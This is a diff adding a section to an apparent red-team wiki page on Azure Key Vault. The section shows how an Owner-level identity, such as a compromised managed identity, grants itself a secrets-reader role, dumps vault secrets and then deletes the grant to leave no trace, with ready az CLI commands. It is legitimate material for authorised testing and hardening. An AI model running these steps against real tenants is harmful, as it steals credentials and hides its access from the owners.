@@ -87,3 +87,35 @@ Tool references are inline in **Methodology**; see the `tools/` pages for CLI us
 ## Sources
 
 - Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
+
+### RBAC-mode vault: an Owner/Contributor identity has NO secret access until it self-grants a data role
+
+Key Vault has two authorization models, and management-plane power does not imply data-plane
+access. On a vault with `enableRbacAuthorization=true` (check `az keyvault show -n <v> --query
+properties.enableRbacAuthorization`), the ARM roles `Owner`, `Contributor`, and `Virtual Machine
+Contributor` do NOT let you read secrets - a `list`/`show` returns `ForbiddenByRbac`
+(`Microsoft.KeyVault/vaults/secrets/readMetadata/action ... Assignment: (not found)`). Reading
+secrets/keys/certs needs a **data-plane** role: `Key Vault Secrets User` (read), `Key Vault Secrets
+Officer`, or `Key Vault Administrator`.
+
+The escalation: any principal with `Microsoft.Authorization/roleAssignments/write` at or above the
+vault scope - i.e. **Owner** or **User Access Administrator** - can assign itself that data role, then
+read. This turns "Owner on the resource group that contains a vault" into "all vault secrets", and is
+the payoff when a compromised managed identity (token from IMDS via `az login --identity`) turns out
+to be Owner on its RG:
+
+```bash
+VID=$(az keyvault show -n <vault> --query id -o tsv)
+RA=$(az role assignment create --assignee-object-id <my-oid> --assignee-principal-type ServicePrincipal \
+     --role "Key Vault Secrets User" --scope "$VID" --query id -o tsv)   # Owner/UAA can do this
+sleep 30                                                                 # RBAC propagation
+az keyvault secret list  --vault-name <vault> -o table
+az keyvault secret show  --vault-name <vault> -n <name> --query value -o tsv
+az role assignment delete --ids "$RA"                                    # revert (leave as found)
+```
+
+Access-policy vaults (`enableRbacAuthorization=false`) differ: there `Contributor` can add itself to
+`accessPolicies` via `az keyvault set-policy` (an ARM write, no RBAC data role needed). Either way,
+management-plane control of a vault is one write away from its secrets. See [[azure-ad-iam]].
+
+<!-- promoted-slug: keyvault-rbac-owner-selfgrant -->
